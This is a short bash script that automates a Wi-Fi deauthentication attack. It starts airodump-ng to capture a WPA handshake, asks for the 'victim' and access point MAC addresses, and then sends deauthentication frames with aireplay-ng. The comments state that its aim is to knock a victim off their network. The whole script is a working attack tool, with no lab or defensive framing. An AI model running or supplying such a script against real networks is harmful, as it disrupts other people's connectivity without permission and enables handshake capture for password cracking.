#!/bin/bash

#This script is to setup wlan1 in monitor mode, and deauth a victim at another location.
#To do that you need to find out what network they are connected to with airodump and then deauth them using airplay

gnome-terminal -x airodump-ng --showack -w handshake mon0

echo "Ready to deauth? Whats the victims mac address?"

read victim

echo "Whats the access points mac address?"

read softap

aireplay-ng -0 5 -a $softap -c $victim mon0